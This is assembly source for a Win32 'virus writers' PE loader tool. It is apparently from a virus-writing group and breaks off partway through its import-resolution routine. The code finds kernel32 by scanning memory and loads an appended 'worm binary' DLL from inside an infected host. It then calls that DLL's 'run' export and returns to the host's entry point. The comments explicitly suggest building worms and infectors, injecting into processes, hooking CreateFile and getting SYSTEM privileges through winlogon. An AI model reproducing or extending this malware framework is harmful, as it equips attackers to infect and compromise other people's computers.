;
;	Win32.VxersPELoaderTool
;
;	This code by itself its not a virus, but it will help ;)
;
;	This code without WormBinary really is nothing. It doesnt infect or propagate in any
;	manner.This code consist of a PE loader that will load a PE file. This PE loader will
;	receive some parameters that will do it lot of flexible:
;
;			parameter 1: pointer to ascii string with the name of the PE 
;			file to load.
;			parameter 2: pointer to real HeapAlloc kernel32 function.
;			parameter 3: pointer to real HeapReAlloc kernel32 function.
;			parameter 4: pointer to real CreateFile kernel32 function.
;			parameter 5: pointer to real ReadFile kernel32 function.
;			parameter 6: pointer to real SetFilePointer kernel32 function.
;			parameter 7: HANDLE of heap of the process.
;			parameter 8: pointer to real HeapFree kernel32 function.
;			parameter 9: reserved.
;			parameter 10: this paremeter should be null for external callers.			
;
;
;	Really now its being used only HeapAlloc,CreateFile,ReadFile and SetFilePointer.
;	You can give real pointers to real windows functions to PE loader,or u could give
;	it pointer to functions that u have writed, modifying the manner of working of
;	the PE loader i.e. in this code im giving it pointers to my own functions for
;	loading a PE that i have in memory (WormBinary offset).
;
;	On the other hand this code will load the PE file in WormBinary and it will search
;	a export function in the PE file, "run", and it will call it with this parameters:
;
;	int  __stdcall run(void * LoadLibraryA, 
;				 void * GetProcAddress,
;				 void * AddrOfVirusBaseVxstart,  ;vxstart label
;				 int    Size,			   ;size of code(WormBinary Included)
;				 int    OffsetOfHostEntryOffset, ;HostEntryOffset label
;				 int    OffsetOfWormBinary,	   ;WormBinary label
;				 int    SizeOfWormBinary	   ;WormBinary size
;				 );
;
;     This function must return 1 if it wants the pe will not free when run returns, or 
;	0 if it wants this code free memory allocated after executing run.
;
;
;	Note the current WormBinary of this file is a "donothing" dll exporting run(...)
;     function only for testing. What u can do with this code?:
;	
;	You can create your own dll exporting your own run function. This environment lets
;	you to code a worm, a infector, or any thing in any high or low level language.
;	
;	Note worm binary its at the last part of the code. This code is able to load any
;	PE in that zone without recompiling. The code will parse PE headers for finding the
;	end of the raw binary (without overlays). Then you could change the binary in a 
;	infection with, for example, other binary downloaded from internet, a plugin. 
;	Or u could add infection and polimorphism to a worm writted in high level language. 
;	Inject your PE with run function exported in other process and create a remote thread
;	in vxstart, and hook createfile in all process :D ... Or inject it to winlogon and
;	get system privileges :) ...	
;
;	Really i think this code could be very useful for virus writers. Lot of things could
;     be done with it.
;
;	Note the current appended worm binary was not compiled with optimizations. You could
;	compiling it (at least in visual c) with size optimizations, or merging sections, or
;	any thing.
;
;	Important note:
;
;	If the PE to be loaded its importing functions dlls must be in the current directory.
;	In addition this loader will not load well a pe importing ntdll.dll (directly or 
;	indirectly) becoz ntdll.dll needs lot of extra initializations. Imported dlls will
;	be loaded in memory lot of apis of ntdll will not work well.
;	Really im recommending ur pe to be appended here doesnt import anything. 
;	Note run are getting as parameters a pointer to LoadLibrary and a pointer 
;	to GetProcAddress. With both apis you can get any other. Use it.
;	
;	Other thing: fourth parameter of run(...), size, must be only used when the pe 
;	appended is the compiled with the code, not other changed in infection time or 
;	in any other manner. In that case use OffsetWormBinary+SizeOfWormBinary to know
;	the total size.
;



.486
.model flat

extrn ExitProcess:proc
extrn HeapAlloc:proc
extrn HeapFree:proc
extrn HeapReAlloc:proc
extrn CreateFileA:proc
extrn ReadFile:proc
extrn SetFilePointer:proc
extrn GetProcessHeap:proc
extrn CopyFileA:proc
extrn GetLastError:proc
extrn GetProcAddress:proc
extrn LoadLibraryA:proc
extrn GetLastError:proc

PUBLIC _start

.data
db 0
.code

start:
_start:


jmp vxstart

mov esi,offset EndWormBinary - 1
movingcode:
mov al,[esi]
mov [esi+1],al
dec esi
cmp esi,offset vxstart - 1
je Endmovingcode
jmp movingcode
Endmovingcode:
mov esi,offset vxstart
mov byte ptr [esi],90h


ExitFirstGeneration:
push 0
call ExitProcess

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;29a files
include mz.inc
include pe.inc
include win32api.inc
include useful.inc


;;;;;;;;;;;;;;;;;;;;;;;
CalcLenString macro
local loopin
push esi
dec esi
loopin:
inc esi
cmp byte ptr[esi],0
jne loopin
mov ecx,esi
pop esi
sub ecx,esi
endm
;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;
;esi->name1 edi->name2.
;When it finish, ecx = 0 if equal or different if not
CompareString macro 
local retfalse
local rettrue
local loopin
push esi
dec esi
loopin:
inc esi
cmp byte ptr[esi],0
jne loopin
mov ecx,esi
pop esi
sub ecx,esi
or ecx,ecx
jz retfalse
cmp byte ptr [edi+ecx],0
jnz retfalse
inc ecx
push esi
push edi
repz cmpsb
pop edi
pop esi
or ecx,ecx
jz rettrue
retfalse:
mov ecx,1
rettrue:
endm
;;;;;;;;;;;;;;;;;;;;;;;


TOKEN_ASSIGN_PRIMARY     	    equ 00000001h
TOKEN_DUPLICATE          	    equ 00000002h
TOKEN_IMPERSONATE        	    equ 00000004h
TOKEN_QUERY              	    equ 00000008h
TOKEN_QUERY_SOURCE       	    equ 00000010h
TOKEN_ADJUST_PRIVILEGES  	    equ 00000020h
TOKEN_ADJUST_GROUPS      	    equ 00000040h
TOKEN_ADJUST_DEFAULT     	    equ 00000080h
TOKEN_ALL_ACCESS 			    equ STANDARD_RIGHTS_REQUIRED or \
						  TOKEN_ASSIGN_PRIMARY     or \
						  TOKEN_DUPLICATE          or \
						  TOKEN_IMPERSONATE        or \
						  TOKEN_QUERY              or \
						  TOKEN_QUERY_SOURCE       or \
						  TOKEN_ADJUST_PRIVILEGES  or \
						  TOKEN_ADJUST_GROUPS      or \
						  TOKEN_ADJUST_DEFAULT
SE_PRIVILEGE_ENABLED 	 	    equ 00000002h
CHECKSUM_SUCCESS         	    equ 00000000h
CHECKSUM_OPEN_FAILURE    	    equ 00000001h
CHECKSUM_MAP_FAILURE     	    equ 00000002h
CHECKSUM_MAPVIEW_FAILURE 	    equ 00000003h
CHECKSUM_UNICODE_FAILURE 	    equ 00000004h
OBJ_CASE_INSENSITIVE 		    equ 00000040h
FILE_DIRECTORY_FILE               equ 00000001h
FILE_WRITE_THROUGH                equ 00000002h
FILE_SEQUENTIAL_ONLY 		    equ 00000004h
FILE_NO_INTERMEDIATE_BUFFERING    equ 00000008h
FILE_SYNCHRONOUS_IO_ALERT 	    equ 00000010h
FILE_SYNCHRONOUS_IO_NONALERT      equ 00000020h
FILE_NON_DIRECTORY_FILE 	    equ 00000040h
FILE_CREATE_TREE_CONNECTION 	    equ 00000080h
FILE_COMPLETE_IF_OPLOCKED 	    equ 00000100h
FILE_NO_EA_KNOWLEDGE 		    equ 00000200h
FILE_OPEN_FOR_RECOVERY            equ 00000400h
FILE_RANDOM_ACCESS                equ 00000800h
FILE_DELETE_ON_CLOSE              equ 00001000h
FILE_OPEN_BY_FILE_ID              equ 00002000h
FILE_OPEN_FOR_BACKUP_INTENT       equ 00004000h
FILE_NO_COMPRESSION               equ 00008000h
FILE_RESERVE_OPFILTER             equ 00100000h
FILE_OPEN_REPARSE_POINT           equ 00200000h
FILE_OPEN_NO_RECALL               equ 00400000h
FILE_OPEN_FOR_FREE_SPACE_QUERY    equ 00800000h
FILE_COPY_STRUCTURED_STORAGE      equ 00000041h
FILE_STRUCTURED_STORAGE           equ 00000441h
FILE_VALID_OPTION_FLAGS           equ 00ffffffh
FILE_VALID_PIPE_OPTION_FLAGS      equ 00000032h
FILE_VALID_MAILSLOT_OPTION_FLAGS  equ 00000032h
FILE_VALID_SET_FLAGS              equ 00000036h
FILE_SHARE_READ			    equ 00000001h
FILE_SHARE_WRITE                  equ 00000002h
FILE_READ_DATA			    equ 00000001h
FILE_WRITE_DATA		          equ 00000002h
FILE_APPEND_DATA			    equ 00000004h
FILE_OPEN_IF			    equ 00000003h
FILE_OPEN				    equ 00000001h
FILE_NON_DIRECTORY_FILE	          equ 00000040h
STATUS_SUCCESS			    equ 00000000h
SEC_COMMIT				    equ 08000000h	
SECTION_QUERY 			    equ 00000001h
SECTION_MAP_WRITE 		    equ 00000002h
SECTION_MAP_READ 		          equ 00000004h
SECTION_MAP_EXECUTE               equ 00000008h
SECTION_EXTEND_SIZE 		    equ 00000010h
STANDART_RIGTHS_REQUIRED          equ 000F0000h
SYNCHRONIZE                       equ 00100000h
THREAD_ALL_ACCESS equ (STANDARD_RIGHTS_REQUIRED + SYNCHRONIZE +  3FFh)
FILE_BEGIN				    equ 00000000h
IMAGE_DOS_HEADERSIZE		    equ size IMAGE_DOS_HEADER
IMAGE_NT_HEADERSSIZE  		    equ size IMAGE_NT_HEADERS
IMAGE_SECTION_HEADERSIZE	    equ size IMAGE_SECTION_HEADER 
HEAP_ZERO_MEMORY			    equ 00000008h

STARTUPINFOSIZE                   equ 68
PROCESSINFORMATIONSIZE   	    equ 16


vxstart:
pop  ebx
push ebx

SearchKernel:

xor bx,bx
cmp word ptr [ebx],'MZ'
je KernelFound
cmp word ptr [ebx],'ZM'
je KernelFound
sub ebx,1000h
jmp SearchKernel
KernelFound:



;we'll get some needed apis
call JumpOverMemoryApis
db 'GetProcAddress',0
GetProcAddressz equ GetProcessHeapz+4
db 'GetProcessHeap',0
GetProcessHeapz equ LoadLibraryz+4
db 'LoadLibraryA',0
LoadLibraryz equ HeapAllocz+4
HeapAllocz equ 0
JumpOverMemoryApis:
pop esi ;opcode 5e
GetNeededApis:
call PEGetProcAddr
or eax,eax
jz LeaveVirusCode
push eax
CalcLenString
lea esi,dword ptr [esi+ecx+1]
cmp byte ptr [esi],5eh ;becareful with apis starting with '^' :P
jne GetNeededApis

mov ebp,esp ;ebp pointing apis

call JumpOverHeapAlloc
db 'HeapAlloc',0		;HeapAlloc api,as others,is problematic. Exported addr is really
				;a string in this manner: NTDLL.RtlHeapAllocate in ntdll, and 
				;loader knows it must resolve import with this other address.
JumpOverHeapAlloc:
push ebx
call dword ptr [ebp + GetProcAddressz-4]
push eax
mov ebp,esp ;ebp pointing apis

call dword ptr [ebp + GetProcessHeapz]
mov ebx,eax
push FILEHANDLESIZE
push HEAP_ZERO_MEMORY
push eax
call dword ptr [ebp + HeapAllocz]
mov byte ptr [eax],'z'
mov edx,eax

push 00000000h
push 00000000h
push 00000000h
push ebx
call mySetFilePointerAddr
add  eax,2
push eax
call myReadFileAddr
add  eax,2
push eax
call myCreateFileAddr
add  eax,2
push eax
push 00000000h
push dword ptr [ebp + HeapAllocz]
push edx
call PeLoader 

pop edx
pop edx ;LoadLibraryA
pop ebx 
pop ebx ;GetProcAddress


or eax,eax
jz LeaveVirusCode

;calling "run" exported function with interface:
;	int  __stdcall run(void * LoadLibraryA, 
;				 void * GetProcAddress,
;				 void * AddrOfVirusBaseVxstart,  ;vxstart label
;				 int    Size,			   ;size of code(WormBinary Included)
;				 int    OffsetOfHostEntryOffset, ;HostEntryOffset label
;				 int    OffsetOfWormBinary,	   ;WormBinary label
;				 int    SizeOfWormBinary	   ;size of WormBinary
;				 );
;     This function must return 1 if it wants the pe will not free when run returns or 
;	0 if it wants this code free memory allocated after executing run.
;;;;;;;;;;;;;;;

mov esi,eax

push eax ; handle of the pe loaded

call WormBinaryAddr
add  eax,2
push eax
mov  eax,dword ptr [eax+3ch]
add  eax,[esp]
xor  ecx,ecx
mov  cx,[eax.IMAGE_NT_HEADERS.NT_FileHeader.FH_NumberOfSections]
dec  ecx
push eax
mov  eax,IMAGE_SIZEOF_SECTION_HEADER
push edx
mul  ecx
pop  edx; DAMN!!!! mul was erasing edx... ;/////////
add  [esp],eax
add  dword ptr [esp],IMAGE_NT_HEADERSSIZE
pop  eax
;eax-> last section hdr
mov  ecx,[eax.IMAGE_SECTION_HEADER.SH_PointerToRawData]
add  ecx,[eax.IMAGE_SECTION_HEADER.SH_SizeOfRawData]

mov  [esp],ecx ;SizeOfWormBinary

mov  eax,WormBinary-vxstart
push eax; Offset of WormBinary

mov  eax,HostEntryOffset-vxstart
push eax; host entry offset

mov  eax,vxend-vxstart
push eax ;code size

call WormBinaryAddr
sub  eax,WormBinary-vxstart-2
push eax ;addr of virus base

push ebx ;GetProcAddress
push edx ;LoadLibraryA

mov ebx,[esi.PEHANDLE.base]
call JumpOverRunStr
db 'run',0
JumpOverRunStr:
pop esi
call PEGetProcAddr

or eax,eax
jnz ContinueCallingRun
add esp,7*4
jmp LeaveVirusCodeWithFree
ContinueCallingRun:
call eax
or eax,eax
jz LeaveVirusCodeWithFree
pop edi ;free stack
jmp LeaveVirusCode

;;;;;;;;;;;;;;;
LeaveVirusCodeWithFree:

pop edi; handle of the loaded dll

mov ebx,[esp];kernel zone

SearchKernelForFree:
xor bx,bx
cmp word ptr [ebx],'MZ'
je KernelFoundForFree
cmp word ptr [ebx],'ZM'
je KernelFoundForFree
sub ebx,1000h
jmp SearchKernelForFree
KernelFoundForFree:

;ebx->kernel base

call JumpOverGetProcAddressForFree
db 'GetProcAddress',0
JumpOverGetProcAddressForFree:
pop esi
call PEGetProcAddr
or eax,eax
jz LeaveVirusCode
call JumpOverHeapFree
db 'HeapFree',0
JumpOverHeapFree:
push ebx
call eax
or eax,eax
jz LeaveVirusCode

push eax

call JumpOverGetProcessHeapForFree
db 'GetProcessHeap',0
JumpOverGetProcessHeapForFree:
pop esi
call PEGetProcAddr

call eax

;eax=heap handle
mov esi,eax

FreeHandles:

mov eax,[edi.PEHANDLE.base]
sub eax,10000h
mov eax,[eax]
push eax
push 0
push esi
call dword ptr [esp+0ch]
mov edi,[edi.PEHANDLE.imported_dlls]
or edi,edi
jnz FreeHandles

pop eax

LeaveVirusCode:
call LeaveVirusCode2
LeaveVirusCode2:
pop ebx
SearchBase:
xor bx,bx
cmp word ptr [ebx],'MZ'
je BaseFound
cmp word ptr [ebx],'ZM'
je BaseFound
sub ebx,1000h
jmp SearchBase

;note HostEntryOffset-vxstart must be aligned to 4...((BaseFound-vxstart+2)%4)=0
PADDING equ  4 -(((BaseFound+2-vxstart) - (4*((BaseFound+2-vxstart)/4))))
db PADDING dup (90h)

BaseFound:

add ebx,00000000h + offset ExitFirstGeneration - 400000h ;first generation only
HostEntryOffset equ $-4
push ebx
call myCreateFileAddr
add eax,2
pop ebx
add eax,HostEntryOffset-myCreateFile
cmp dword ptr [eax],00000000h
je EPOSupport
jmp ebx
EPOSupport:
jmp vxend+20 ;when we encrypted and EPO we have reserved some more bytes with nops
		 ;for avoiding problems, so we will jump there.
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Environment Functions
;note we want to load a pe file that we have in the own code, so we will give to PE loader
;this pseudo-read/create/setpointer functions, and in this manner we will load the own PE
;that we have here.
;Other thing to say is that myCreateFile will receive a file name. When we call Pe loader 
;with this functions as parameters, we should give it a memory reserved zone in the filename
;parameter that createfile will use for keeping its own handle.

FILEHANDLE struct
CurrentSeek dd 0
FILEHANDLE ends

FILEHANDLESIZE equ SIZE FILEHANDLE

myReadFileAddr:
call myReadFileAddr2
myReadFileAddr2:
pop eax
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
myReadFile:
pushad
mov edi,[esp+8+32]
mov esi,[esp+4+32]
mov esi,[esi]
mov ecx,[esp+0ch+32]
mov edx,[esp+10h+32]
mov [edx],ecx
rep movsb
mov ecx,[esp+0ch+32]
mov esi,[esp+4+32]
mov eax,[esi]
add eax,ecx
mov [esi],eax
popad
mov eax,1
ret 20
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

myCreateFileAddr:
call myCreateFileAddr2
myCreateFileAddr2:
pop eax
ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
myCreateFile:
mov eax,[esp+4]
mov dword ptr [eax],00000000h ;its a FILEHANDLE struc
ret 1ch
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

mySetFilePointerAddr:
call mySetFilePointerAddr2
mySetFilePointerAddr2:
pop eax
ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
mySetFilePointer:

pushad
call WormBinaryAddr
add eax,2

mov ebx,[esp+4+32]
mov ecx,[esp+8+32]
;mov edx,[esp+10h+32] ;temporaly method seek_set always

add eax,ecx
mov [ebx],eax
mov dword ptr [esp.Pushad_struc.Pushad_eax],eax
popad

ret 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;PeLoader:
;
;Type:		General.
;
;Description:	This function will load a PE file for executing it without calling 
;			operating system loader. I had problems loading a entire PE file with
;			normal imports (for example,kernel32). I have not tried 9x, but in
;			NT i got problems loading for example kernel32 due ntdll.dll 
;			initialization. Super said me i should call LdrInitializeThunk ntdll's
;			export, however this solution was not valid, al least for this case :(
;
;Parameters:	This function will receive parameters in __stdcall calling convention.
;			
;			parameter 1: pointer to ascii string with the name of the PE 
;			file to load.
;			parameter 2: pointer to real HeapAlloc kernel32 function.
;			parameter 3: pointer to real HeapReAlloc kernel32 function.
;			parameter 4: pointer to real CreateFile kernel32 function.
;			parameter 5: pointer to real ReadFile kernel32 function.
;			parameter 6: pointer to real SetFilePointer kernel32 function.
;			parameter 7: HANDLE of heap of the process.
;			parameter 8: pointer to real HeapFree kernel32 function.
;			parameter 9: reserved.
;			parameter 10: this paremeter should be null for external callers.			
;
;Returned Values:
;			none
;
;notes:
;			All dependencies of the PE to be loaded must be in the same folder.
;			In addition, you must set the folder of PE to be loaded as current
;			folder before calling this function.
;			This function will not check the integrity of the PE file. It will 
;			suppose the MZ/PE headers are good.		
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;macros

;;;;;;;;;;;;;;;;;
malloc macro malloc_macro_size
local malloc_macro_leave
pushad
mov eax,malloc_macro_size
and eax,0FFFF0000h
add eax,00030000h
push eax
push HEAP_ZERO_MEMORY
push dword ptr [ebp + PE_loader_hHeap]
call dword ptr [ebp + PE_loader_pHeapAlloc]
or eax,eax
jz malloc_macro_leave
push eax
and eax,0FFFF0000h
add eax,00010000h
pop dword ptr [eax]
add eax,00010000h
malloc_macro_leave:
mov [esp.Pushad_struc.Pushad_eax],eax
popad
endm
;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;
free macro free_macro_addr
pushad
mov eax,free_macro_addr
sub eax,00010000h
mov eax,[eax]
push eax
push 00000000h
push dword ptr [ebp + PE_loader_hHeap]
call dword ptr [ebp + PE_loader_pHeapFree]
mov [esp.Pushad_struc.Pushad_eax],eax
popad
endm
;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;
open macro open_macro_filename
push 00000000h
push FILE_ATTRIBUTE_NORMAL
push OPEN_EXISTING
push 00000000h
push FILE_SHARE_READ
push GENERIC_READ
push open_macro_filename
call dword ptr [ebp + PE_loader_pCreateFile]
endm
;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;
read macro read_macro_handle,read_macro_buffer,read_macro_size
push 00000000h ;read bytes
push 00000000h
push esp
add dword ptr [esp],4
push read_macro_size
push read_macro_buffer
push read_macro_handle
call dword ptr [ebp + PE_loader_pReadFile]
pop eax
endm
;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;
seek macro seek_macro_handle,seek_macro_offset
push FILE_BEGIN
push 0
push seek_macro_offset
push seek_macro_handle
call dword ptr [ebp + PE_loader_pSetFilePointer]
endm
;;;;;;;;;;;;;;;;;


;Types

;;;;;;;;;;;;;;;;;
PEHANDLE struct
base 			dd 	?
size 			dd    ?
pehdrs		IMAGE_NT_HEADERS  ?
imported_dlls	dd    ? ;(PEHANDLE *) list
PEHANDLE ends

PEHANDLESIZE          equ size PEHANDLE
;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;
;Variables (offsets from ebp in stack)
N_VARIABLES  	equ 3
;;;;;;;;;;;
pe_handle		equ -4h  ;pointer to a PEHANDLE structure
hfile			equ -8h  ;file handle of PE to load
temp			equ -0ch ;temp data
;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;
;Arguments (offsets from ebp in stack)
PE_FileName  			equ 8h
PE_loader_pHeapAlloc   		equ 0ch
PE_loader_pHeapReAlloc 		equ 10h
PE_loader_pCreateFile	 	equ 14h
PE_loader_pReadFile	 	equ 18h
PE_loader_pSetFilePointer	equ 1ch
PE_loader_hHeap			equ 20h
PE_loader_pHeapFree		equ 24h
PE_loader_reserved		equ 28h
PE_loader_FirstHandleOfList   equ 2ch
;;;;;;;;;;;;;;;;;

;;;;;;;;;
PeLoader:
;;;;;;;;;

push ebp
mov ebp,esp
pushad
pushfd
sub esp,N_VARIABLES*4

;opening PE to load
;;;;;;;;;;;;
mov eax,dword ptr [ebp+PE_FileName]  
open eax
or eax,eax
jz LeavePeLoader
mov dword ptr [ebp + hfile],eax
;;;;;;;;;;;;



;getting space for our memory handle
;;;;;;;;;;;;
malloc PEHANDLESIZE
or eax,eax
jz LeavePeLoader
mov dword ptr [ebp + pe_handle],eax
;;;;;;;;;;;;



;we search the needed size of memory for loading the PE file
;;;;;;;;;;;;
mov eax,dword ptr [ebp + hfile]
seek eax,0000003ch			;pointer to lfanew
mov eax,dword ptr [ebp + hfile]
lea ebx,dword ptr [ebp + temp]	
read eax,ebx,4				;reading offset of PE header to temp
mov eax,dword ptr [ebp + hfile]
mov ebx,dword ptr [ebp + temp]
add ebx,IMAGE_NT_HEADERS.NT_OptionalHeader.OH_SizeOfImage
seek eax,ebx				;pointer to size of image in optional header
mov eax,dword ptr [ebp + hfile]
mov ebx,dword ptr [ebp + pe_handle]
lea ebx,dword ptr [ebx.PEHANDLE.size]	
read eax,ebx,4				;reading size of image in memory
;;;;;;;;;;;;



;we will reserve enought memory for loading the PE
;;;;;;;;;;;;
mov eax,[ebp + pe_handle]
mov eax,[eax.PEHANDLE.size]
malloc eax
or eax,eax
jz LeavePeLoaderAndFree_1
mov ebx,[ebp + pe_handle]
mov [ebx.PEHANDLE.base],eax
;;;;;;;;;;;;



;now we will get in memory dos and PE headers.
;;;;;;;;;;;;
mov eax,dword ptr [ebp + hfile]
seek eax,00000000h			;going to start of PE in disk
mov eax,dword ptr [ebp + hfile]
mov ebx,dword ptr [ebp + pe_handle]
mov ebx,dword ptr [ebx.PEHANDLE.base]
read eax,ebx,IMAGE_DOS_HEADERSIZE	;reading all dos header

mov eax,dword ptr [ebp + hfile]
mov ebx,dword ptr [ebp + pe_handle]
mov ebx,dword ptr [ebx.PEHANDLE.base]
mov ebx,dword ptr [ebx.IMAGE_DOS_HEADER.MZ_lfanew]
seek eax,ebx				;going PE header in disk

mov ebx,dword ptr [ebp + pe_handle]
mov ebx,dword ptr [ebx.PEHANDLE.base]
add ebx,[ebx.IMAGE_DOS_HEADER.MZ_lfanew]
mov eax,dword ptr [ebp + hfile]
read eax,ebx,IMAGE_NT_HEADERSSIZE	;reading PE header

;sections headers
mov ebx,[ebp + pe_handle]
mov ebx,[ebx.PEHANDLE.base]
add ebx,[ebx.IMAGE_DOS_HEADER.MZ_lfanew]
xor ecx,ecx
mov cx,word ptr [ebx.IMAGE_NT_HEADERS.NT_FileHeader.FH_NumberOfSections]
mov eax,IMAGE_SECTION_HEADERSIZE
mul ecx
add ebx,IMAGE_NT_HEADERSSIZE
mov ecx,[ebp + hfile]
read ecx,ebx,eax
;;;;;;;;;;;;


;Next step is to load sections in its rvas
;;;;;;;;;;;;
mov ebx,[ebp + pe_handle]
mov ebx,[ebx.PEHANDLE.base]
mov edx,ebx
add ebx,[ebx.IMAGE_DOS_HEADER.MZ_lfanew]
xor ecx,ecx
mov cx,word ptr [ebx.IMAGE_NT_HEADERS.NT_FileHeader.FH_NumberOfSections]
add ebx,IMAGE_NT_HEADERSSIZE
mov eax,[ebp + hfile]
MapAllSections:
mov esi,[ebx.IMAGE_SECTION_HEADER.SH_PointerToRawData]
pushad
seek eax,esi
popad
mov esi,[ebx.IMAGE_SECTION_HEADER.SH_VirtualAddress]
add esi,edx
mov edi,[ebx.IMAGE_SECTION_HEADER.SH_SizeOfRawData]
pushad
read eax,esi,edi
popad
add  ebx,IMAGE_SECTION_HEADERSIZE
loop MapAllSections
;;;;;;;;;;;;

;;;;;;;;;;;;
;At this point all pe should be loaded in memory, in its associated VAs.
;Things to do:
;	Loading imported dlls.
;	Resolving Imports.
;	Resolving Relocs.
;;;;;;;;;;;;

mov ebx,[ebp + pe_handle]
mov ebx,[ebx.PEHANDLE.base]
call ResolveRelocs

call ResolveImports

mov ebx,[ebp + pe_handle]
mov ebx,[ebx.PEHANDLE.base]
mov eax,[ebx+3ch]
add eax,ebx
mov eax,[eax.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_AddressOfEntryPoint]
or eax,eax
jz PELoader_NotDllMain
add eax,ebx

push 0
push 1 ;DLL_PROCESS_ATTACH
push ebx
call eax ;dllmain

PELoader_NotDllMain:

;Leaving funcion
;;;;;;;;;;;;
LeavePeLoaderWithNoError:

mov eax,[ebp + pe_handle]
add esp,N_VARIABLES*4
popfd
mov dword ptr [esp.Pushad_struc.Pushad_eax],eax
popad
pop ebp
retn 28h

LeavePeLoaderAndFree_2:
mov eax,[ebp + pe_handle]
mov eax,[eax.PEHANDLE.base]
free eax
LeavePeLoaderAndFree_1:
mov eax,[ebp + pe_handle]
free eax
LeavePeLoader:
add esp,N_VARIABLES*4
popfd
popad
pop ebp
retn 28h

;;;;;;;;;;;;
;ebp ->frame of PELoader function
;PE must be loaded in memory, in good associated RVAs.
ResolveImports:
pushad
pushfd

mov ebx,[ebp + pe_handle]
mov ebx,[ebx.PEHANDLE.base]

mov esi,ebx
add esi,dword ptr [ebx+3ch]
mov esi,dword ptr [esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
or esi,esi
jz EndResolvingImports
add esi,ebx

;esi-> IMAGE_IMPORT_DESCRIPTOR array

NextImageImportDescriptor:

mov eax,[esi]
or  eax,eax
jz  EndResolvingImports

call ResolveImageImportDescriptor

add esi,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
jmp NextImageImportDescriptor

EndResolvingImports:
popfd
popad
ret

;;;;;;;;;;;;
;ebp->frame of PELoader function
;esi->current IMAGE_IMPORT_DESCRIPTOR
ResolveImageImportDescriptor:
pushfd
pushad

mov ebx,[ebp + pe_handle]
mov ebx,[ebx.PEHANDLE.base]

mov edi,[esi.IMAGE_IMPORT_DESCRIPTOR.ID_FirstThunk]
add edi,ebx
mov eax,[esi.IMAGE_IMPORT_DESCRIPTOR.ID_OriginalFirstThunk]
or  eax,eax
jnz ImportDescriptorNameSourceSelected
mov eax,[esi.IMAGE_IMPORT_DESCRIPTOR.ID_FirstThunk]
ImportDescriptorNameSourceSelected:
mov edx,esi
mov esi,eax
add esi,ebx

;edx-> import descriptor
;esi-> array of pointers to names of imported functions
;edi-> array of pointers to destinations of VAs of imported functions
;ebx-> MZ

pushad ;saving registers with previous information

cmp dword ptr [ebp+PE_loader_FirstHandleOfList],00000000h
jne ItsNotFirstRecursion
mov eax,dword ptr [ebp+pe_handle]
mov dword ptr [ebp+PE_loader_FirstHandleOfList],eax
push dword ptr [ebp+pe_handle]
jmp AllParametersForRecursion

ItsNotFirstRecursion:

push esi
mov esi,dword ptr [edx.IMAGE_IMPORT_DESCRIPTOR.ID_Name]
add esi,ebx
mov eax,[ebp + PE_loader_FirstHandleOfList]
call SearchDllHandleByName
pop esi
or eax,eax
jnz HandleOfImportedFound

push dword ptr [ebp+PE_loader_FirstHandleOfList]

AllParametersForRecursion:
push dword ptr [ebp + PE_loader_reserved]
push dword ptr [ebp + PE_loader_pHeapFree]
push dword ptr [ebp + PE_loader_hHeap]
push dword ptr [ebp + PE_loader_pSetFilePointer]
push dword ptr [ebp + PE_loader_pReadFile]
push dword ptr [ebp + PE_loader_pCreateFile]
push dword ptr [ebp + PE_loader_pHeapReAlloc]
push dword ptr [ebp + PE_loader_pHeapAlloc]
mov eax,dword ptr [edx.IMAGE_IMPORT_DESCRIPTOR.ID_Name]
add eax,ebx
push eax
call PeLoader

;eax->handle of the imported loaded module

mov edx,eax
mov eax,[ebp + pe_handle]
call GoEndListOfPEhandles

